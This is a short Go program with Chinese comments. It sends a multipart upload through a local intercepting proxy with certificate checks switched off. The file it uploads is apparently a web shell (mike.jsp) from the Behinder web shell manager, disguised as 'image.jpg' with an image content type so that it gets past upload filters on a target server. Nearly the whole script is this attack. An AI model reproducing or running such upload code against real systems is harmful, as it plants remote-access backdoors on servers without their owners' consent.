package main

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"net/textproto"
	"net/url"
	"os"
	"time"
)

var proxyUrl, _ = url.Parse("http://127.0.0.1:8080")

var transport = &http.Transport{
	Proxy: http.ProxyURL(proxyUrl), //设置代理 发送请求
	TLSClientConfig: &tls.Config{
		InsecureSkipVerify: true, //通过设置Transport的TLSClientConfig来忽略证书验证:
	},
}

var client = http.Client{
	Timeout:   time.Second * 10,
	Transport: transport,
}

func main() {
	var buffer bytes.Buffer
	writer := multipart.NewWriter(&buffer)

	// 添加图片文件
	header := make(textproto.MIMEHeader)
	header.Set("Content-Disposition", `form-data; name="fileField"; filename="image.jpg"`)
	header.Set("Content-Type", "image/jpeg")
	fileWriter, err := writer.CreatePart(header)
	if err != nil {
		fmt.Println(err)
		return
	}

	// 打开要上传的文件
	file, err := os.Open("D:\\youxi\\0x7eTools\\Tools\\WebShell\\webshell_Manage\\Behinder\\Behinder_v4.0.6\\server\\mike.jsp")
	if err != nil {
		fmt.Println(err)
	}
	defer file.Close()

	_, err = io.Copy(fileWriter, file)
	if err != nil {
		fmt.Println(err)
		return
	}
	// 添加文件
	fileWriters, err := writer.CreateFormFile("fileField", "filename.txt")
	if err != nil {
		fmt.Println(err)
		return
	}
	_, err = io.Copy(fileWriters, file)

	_ = writer.Close()

	request, err := http.NewRequest("POST", "http://example.com", &buffer)
	if err != nil {
		fmt.Println(err)
		return
	}

	request.Header.Set("Content-Type", writer.FormDataContentType())

	response, err := client.Do(request)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer response.Body.Close()

	fmt.Println("Response status:", response.Status)
}
